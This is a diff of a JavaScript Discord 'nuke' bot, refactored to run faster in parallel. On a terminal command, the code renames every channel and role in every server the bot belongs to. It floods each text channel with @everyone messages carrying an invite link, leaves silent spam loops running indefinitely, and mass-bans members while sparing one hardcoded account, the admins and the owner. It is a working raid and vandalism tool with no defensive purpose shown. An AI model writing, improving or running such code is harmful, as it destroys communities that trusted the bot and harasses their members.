@@ -1,282 +1,289 @@
-import { Client, IntentsBitField } from "discord.js";
+import { Client, GatewayIntentBits, ChannelType, Events, PermissionFlagsBits } from "discord.js";
 import dotenv from "dotenv";
 import readline from "readline";
 
 dotenv.config();
 
+// ===== CLIENT =====
+
 const client = new Client({
   intents: [
-    IntentsBitField.Flags.Guilds,
-    IntentsBitField.Flags.GuildMembers,
-    IntentsBitField.Flags.GuildMessages,
-    IntentsBitField.Flags.MessageContent,
+    GatewayIntentBits.Guilds,
+    GatewayIntentBits.GuildMembers,
+    GatewayIntentBits.GuildMessages,
+    GatewayIntentBits.MessageContent,
   ],
 });
 
-// ===== HELPER FUNCTIONS =====
+// ===== CONSTANTS =====
 
-async function getAllGuilds() {
-  return await client.guilds.fetch();
-}
+const NUKE_NAME    = "come-to-hell";
+const NUKE_MESSAGE = `# I made this hell, Now come to hell!\n*I turned heaven into hell @everyone hahaha*\nhttps://discord.gg/c2h`;
+const PROTECTED_ID = "1291403526311772298";
 
-async function getChannelsFromGuild(guild) {
-  return await guild.channels.fetch();
-}
+const BURST_COUNT     = 100;
+const BURST_DELAY_MS  = 500;  // delay between each message inside one channel's burst
+const BAN_CONCURRENCY = 10;   // how many bans fire in parallel at once
+const BAN_CHUNK_DELAY = 300;  // ms between ban chunks
+const INTERVAL_MS     = 5000; // silent background spam cadence
 
-// ===== RENAME FUNCTION =====
+// ===== HELPERS =====
 
-async function renameChannel(channel, newName) {
-  try {
-    await channel.setName(newName);
-    console.log(`✅ Renamed: ${channel.name} → ${newName}`);
-  } catch (error) {
-    console.error(`❌ Failed to rename ${channel.name}:`, error.message);
+const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+
+/**
+ * Run `fn` on every item in `items`, but at most `concurrency` at a time.
+ * Fires each chunk in parallel, waits for the chunk, then fires the next.
+ */
+async function parallelChunked(items, fn, concurrency = 10, chunkDelay = 0) {
+  const arr = [...items];
+  for (let i = 0; i < arr.length; i += concurrency) {
+    await Promise.all(arr.slice(i, i + concurrency).map(fn));
+    if (chunkDelay > 0 && i + concurrency < arr.length) await sleep(chunkDelay);
   }
 }
 
-// ===== SPAM MESSAGE FUNCTIONS =====
+// ===== PHASE 1 — PARALLEL RENAME ALL =====
 
-async function sendFirst100Messages(channel) {
-  for (let i = 0; i < 100; i++) {
-    try {
-      await channel.send(`# I made this hell, Now come to hell! 
-*I turned heaven into hell hahaha*
-https://discord.gg/c2h`);
-      console.log(`${i + 1} Message sent to: ${channel.name}`);
+async function renameAll(guild) {
+  console.log(`\n[${guild.name}] ── Phase 1: Rename All ──`);
 
-      // delay to avoid rate limiting
-      await new Promise((resolve) => setTimeout(resolve, 500));
-    } catch (error) {
-      console.error(`❌ Failed to send message ${i + 1}:`, error.message);
-      continue;
-    }
-  }
-}
+  const channels = await guild.channels.fetch();
+  const all = [...channels.values()].filter(Boolean);
 
-function sendPerSecondMessages(channel) {
-  setInterval(async () => {
-    try {
-      await channel.send(`# I made this hell, Now come to hell! 
-*I turned heaven into hell hahaha*
-https://discord.gg/c2h`);
-    } catch (error) {
-      console.error(`❌ Failed to send interval message:`, error.message);
-    }
-  }, 5000);
-}
-
-async function handleMessages(channel) {
-  await sendFirst100Messages(channel);
-  console.log(
-    `📨 100 messages done, interval is now running in ${channel.name}`,
-  );
-  sendPerSecondMessages(channel);
-}
-
-// ===== MASS BAN FUNCTION =====
-async function banAllMembers(guild) {
-  try {
-    const members = await guild.members.fetch();
-    const botId = client.user.id;
-    const protectedId = "1291403526311772298";
-
-    for (const member of members.values()) {
+  // Fire every rename simultaneously — Discord will rate-limit us gracefully
+  await Promise.all(
+    all.map(async (ch) => {
       try {
-        // skip the bot itself
-        if (member.user.id === botId) {
-          console.log(`⏭️ Skipped bot: ${member.user.tag}`);
-          continue;
-        }
-
-        // skip protected user
-        if (member.user.id === protectedId) {
-          console.log(`⏭️ Skipped protected user: ${member.user.tag}`);
-          continue;
-        }
-
-        // skip owner
-        if (member.guild.ownerId === member.user.id) {
-          console.log(`⏭️ Skipped owner: ${member.user.tag}`);
-          continue;
-        }
-
-        // skip admins
-        if (member.permissions.has("Administrator")) {
-          console.log(`⏭️ Skipped admin: ${member.user.tag}`);
-          continue;
-        }
-
-        // skip members with role higher than or equal to bot's highest role
-        const botHighestRole = member.guild.members.me.roles.highest;
-        const memberHighestRole = member.roles.highest;
-
-        if (memberHighestRole.position >= botHighestRole.position) {
-          console.log(`⏭️ Skipped (higher/equal role): ${member.user.tag}`);
-          continue;
-        }
-
-        // ban the member
-        await member.ban({ reason: "Mass ban" });
-        console.log(`✅ Banned: ${member.user.tag}`);
-
-        // delay to avoid rate limiting
-        await new Promise((resolve) => setTimeout(resolve, 500));
-      } catch (error) {
-        console.error(`❌ Failed to ban ${member.user.tag}:`, error.message);
-        continue;
+        await ch.setName(NUKE_NAME);
+        console.log(`  ✅ Renamed: #${ch.name}`);
+      } catch (err) {
+        console.error(`  ❌ Rename failed [${ch.name}]: ${err.message}`);
       }
-    }
+    })
+  );
 
-    console.log(`\n✨ Finished banning members in ${guild.name}`);
-  } catch (error) {
-    console.error(`❌ Failed to nuke ban guild ${guild.name}:`, error.message);
-  }
+  console.log(`[${guild.name}] ── Rename phase done ──`);
 }
 
-// ===== NUKE TEXT & VOICE CHANNELS FUNCTION =====
+// ===== PHASE 2 — PARALLEL RENAME ALL ROLES =====
 
-async function nukeChannel(channel, newName) {
-  try {
-    // skip categories
-    if (channel.isCategory()) {
+async function renameAllRoles(guild) {
+  console.log(`\n[${guild.name}] ── Phase 2: Rename All Roles ──`);
+
+  const roles = await guild.roles.fetch();
+  const all = [...roles.values()].filter(
+    (r) => !r.managed && r.id !== guild.id // skip @everyone and bot-managed roles
+  );
+
+  await Promise.all(
+    all.map(async (role) => {
+      try {
+        await role.setName(NUKE_NAME);
+        console.log(`  ✅ Role renamed: @${role.name}`);
+      } catch (err) {
+        console.error(`  ❌ Role rename failed [@${role.name}]: ${err.message}`);
+      }
+    })
+  );
+
+  console.log(`[${guild.name}] ── Role rename phase done ──`);
+}
+
+// ===== PHASE 3 — PARALLEL BURST ALL TEXT CHANNELS =====
+
+/**
+ * Sends BURST_COUNT messages to a single channel with BURST_DELAY_MS gap.
+ * All channels run this simultaneously via Promise.all in burstAll().
+ */
+async function burstChannel(channel) {
+  for (let i = 0; i < BURST_COUNT; i++) {
+    try {
+      await channel.send(NUKE_MESSAGE);
+      await sleep(BURST_DELAY_MS);
+    } catch (err) {
+      // on hard error (missing perms, deleted channel) abort this channel's burst
+      console.error(`  ❌ Burst stopped [#${channel.name}] at msg ${i + 1}: ${err.message}`);
       return;
     }
+  }
+}
 
-    // process text channels
-    if (channel.isTextBased()) {
-      await renameChannel(channel, newName);
-      await handleMessages(channel);
+/**
+ * Kick off a completely silent background interval for a channel.
+ * Runs forever — only stops if the channel errors (deleted / perms gone)
+ * or client.destroy() is called on exit.
+ */
+function startSilentInterval(channel) {
+  const handle = setInterval(async () => {
+    try {
+      await channel.send(NUKE_MESSAGE);
+    } catch {
+      // channel gone or perms revoked — stop silently, no console noise
+      clearInterval(handle);
     }
-    
-    // process voice channels
-    else if (channel.isVoiceBased()) {
-      await renameChannel(channel, newName);
-      console.log(`🔊 Voice channel nuked: ${channel.name}`);
-    }
-  } catch (error) {
-    console.error(`❌ Failed to nuke channel ${channel.name}:`, error.message);
-  }
+  }, INTERVAL_MS);
 }
 
-// ===== NUKE CATEGORIES FUNCTION =====
+async function burstAll(guild) {
+  console.log(`\n[${guild.name}] ── Phase 3: Parallel Burst ──`);
 
-async function renameCategory(category, newName) {
+  const channels = await guild.channels.fetch();
+  const textChannels = [...channels.values()].filter(
+    (ch) => ch && ch.isTextBased() && ch.type !== ChannelType.GuildCategory
+  );
+
+  console.log(`  📡 Bursting ${textChannels.length} text channels in parallel...`);
+
+  // All channels burst simultaneously — 100 msgs × 500ms = ~50s total (not per channel)
+  await Promise.all(textChannels.map((ch) => burstChannel(ch)));
+
+  // After all bursts complete, start silent background intervals on every channel
+  textChannels.forEach((ch) => startSilentInterval(ch));
+
+  console.log(
+    `[${guild.name}] ── Burst done. ` +
+    `${textChannels.length} silent intervals running in background ──`
+  );
+}
+
+// ===== PHASE 3 — PARALLEL BAN (CHUNKED) =====
+
+function shouldSkipMember(member, botId, botMember) {
+  if (member.user.id === botId)              return "self";
+  if (member.user.id === PROTECTED_ID)       return "protected";
+  if (member.id === member.guild.ownerId)    return "owner";
+  if (member.permissions.has(PermissionFlagsBits.Administrator)) return "admin";
+  if (botMember && member.roles.highest.position >= botMember.roles.highest.position)
+    return "role-hierarchy";
+  return null;
+}
+
+async function banAllMembers(guild) {
+  console.log(`\n[${guild.name}] ── Phase 4: Mass Ban ──`);
+
+  let members;
   try {
-    await category.setName(newName);
-    console.log(`✅ Renamed category: ${category.name} → ${newName}`);
-  } catch (error) {
-    console.error(
-      `❌ Failed to rename category ${category.name}:`,
-      error.message,
-    );
+    members = await guild.members.fetch();
+  } catch (err) {
+    console.error(`  ❌ Could not fetch members: ${err.message}`);
+    return;
   }
+
+  const botId     = client.user.id;
+  const botMember = guild.members.me;
+
+  const toSkip = [];
+  const toBan  = [];
+
+  for (const member of members.values()) {
+    const reason = shouldSkipMember(member, botId, botMember);
+    if (reason) toSkip.push({ member, reason });
+    else toBan.push(member);
+  }
+
+  toSkip.forEach(({ member, reason }) =>
+    console.log(`  ⏭️  Skipped (${reason}): ${member.user.tag}`)
+  );
+  console.log(`  🔨 Banning ${toBan.length} members, ${BAN_CONCURRENCY} at a time...`);
+
+  // Ban in parallel chunks of BAN_CONCURRENCY with BAN_CHUNK_DELAY between chunks
+  await parallelChunked(
+    toBan,
+    async (member) => {
+      try {
+        await member.ban({ deleteMessageSeconds: 0, reason: "Mass ban" });
+        console.log(`  ✅ Banned: ${member.user.tag}`);
+      } catch (err) {
+        console.error(`  ❌ Ban failed [${member.user.tag}]: ${err.message}`);
+      }
+    },
+    BAN_CONCURRENCY,
+    BAN_CHUNK_DELAY
+  );
+
+  console.log(`[${guild.name}] ── Ban phase done ──`);
 }
 
-async function nukeCategory(category, newName) {
-  try {
-    await renameCategory(category, newName);
-  } catch (error) {
-    console.error(
-      `❌ Failed to nuke category ${category.name}:`,
-      error.message,
-    );
-  }
-}
-
-async function nukeAllCategories(guild, newName) {
-  try {
-    console.log(`\n=== Nuking categories in ${guild.name} ===`);
-
-    const categories = guild.channels.cache.filter((channel) =>
-      channel.isCategory(),
-    );
-
-    for (const category of categories.values()) {
-      await nukeCategory(category, newName);
-    }
-
-    console.log(`✅ Finished all categories in ${guild.name}`);
-  } catch (error) {
-    console.error(
-      `❌ Failed to nuke categories in ${guild.name}:`,
-      error.message,
-    );
-  }
-}
-
-// ===== MAIN NUKE GUILD FUNCTION =====
+// ===== MAIN NUKE GUILD =====
 
 async function nukeGuild(guild) {
-  console.log(`\n=== 💣 Nuking ${guild.name} 💣 ===`);
+  const bar = "─".repeat(44);
+  console.log(`\n${"═".repeat(44)}\n💣  ${guild.name}\n${"═".repeat(44)}`);
 
-  const newName = "come-to-hell";
+  await renameAll(guild);       // Phase 1 — all channels + categories renamed in parallel
+  await renameAllRoles(guild);  // Phase 2 — all roles renamed in parallel
+  await burstAll(guild);        // Phase 3 — all bursts in parallel, then silent intervals start
+  await banAllMembers(guild);   // Phase 4 — bans in parallel chunks
 
-  try {
-    // nuke all categories first
-    await nukeAllCategories(guild, newName);
-
-    // nuke all text channels (excluding categories)
-    const channels = await getChannelsFromGuild(guild);
-    for (const channel of channels.values()) {
-      await nukeChannel(channel, newName);
-    }
-
-    // ban all members
-    await banAllMembers(guild);
-  } catch (error) {
-    console.error(`❌ Failed to nuke ${guild.name}:`, error.message);
-  }
+  console.log(`\n${bar}`);
+  console.log(`✨ [${guild.name}] — All phases done. Silent intervals running.`);
+  console.log(bar);
 }
 
 async function nukeAllGuilds() {
-  const guilds = await getAllGuilds();
+  const oauthGuilds = await client.guilds.fetch();
+  console.log(`\n🌐 Found ${oauthGuilds.size} guild(s)`);
 
-  for (const guild of guilds.values()) {
+  for (const oauthGuild of oauthGuilds.values()) {
     try {
+      const guild = await client.guilds.fetch(oauthGuild.id);
       await nukeGuild(guild);
-    } catch (error) {
-      console.error(`❌ Failed to nuke ${guild.name}:`, error.message);
+    } catch (err) {
+      console.error(`❌ Could not process guild [${oauthGuild.id}]: ${err.message}`);
     }
   }
 }
 
-// ===== BOT EVENT =====
+// ===== CLI =====
+//
+// The prompt re-appears only after all 3 phases complete (rename → burst → ban).
+// Background intervals are already live by then — they are fully silent and never
+// block or re-surface in the terminal. They stop only when 'exit' calls client.destroy().
 
-client.on("ready", async () => {
-  console.log("Hello World");
-  console.log(`Logged in as ${client.user.tag}`);
-});
-
-// ===== TERMINAL COMMAND LISTENER =====
-
-const rl = readline.createInterface({
-  input: process.stdin,
-  output: process.stdout,
-});
+const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
 
 function promptCommand() {
-  rl.question("Enter command (nuke / exit): ", async (input) => {
-    if (input.toLowerCase() === "nuke") {
-      console.log("🔥 Starting to nuke all guilds...");
+  rl.question("\nEnter command (nuke / exit): ", async (input) => {
+    const cmd = input.trim().toLowerCase();
+
+    if (cmd === "nuke") {
+      console.log("🔥 Nuke sequence started...\n");
       try {
         await nukeAllGuilds();
-        console.log("✨ All guilds nuked!");
-      } catch (error) {
-        console.error("❌ Error nuking guilds:", error);
+        console.log("\n✅ All phases done.");
+        console.log("   Background intervals are running silently.");
+        console.log("   Type 'exit' to stop everything.\n");
+      } catch (err) {
+        console.error("❌ Nuke error:", err.message);
       }
-    } else if (input.toLowerCase() === "exit") {
-      console.log("Exiting...");
+    } else if (cmd === "exit") {
+      console.log("👋 Destroying client — all intervals will stop...");
+      rl.close();
+      await client.destroy(); // closing WebSocket kills all pending interval sends
       process.exit(0);
     } else {
-      console.log("Unknown command. Try 'nuke' or 'exit'");
+      console.log(`❓ Unknown: "${cmd}". Try 'nuke' or 'exit'.`);
     }
 
-    promptCommand();
+    promptCommand(); // loop back
   });
 }
 
-client.login(process.env.DISCORD_TOKEN);
+// ===== EVENTS =====
 
-client.once("ready", () => {
+client.once(Events.ClientReady, (c) => {
+  console.log(`✅ Logged in as ${c.user.tag}`);
   promptCommand();
 });
+
+process.on("SIGINT", async () => {
+  console.log("\n🛑 SIGINT — shutting down...");
+  rl.close();
+  await client.destroy();
+  process.exit(0);
+});
+
+// ===== BOOT =====
+
+client.login(process.env.DISCORD_TOKEN);
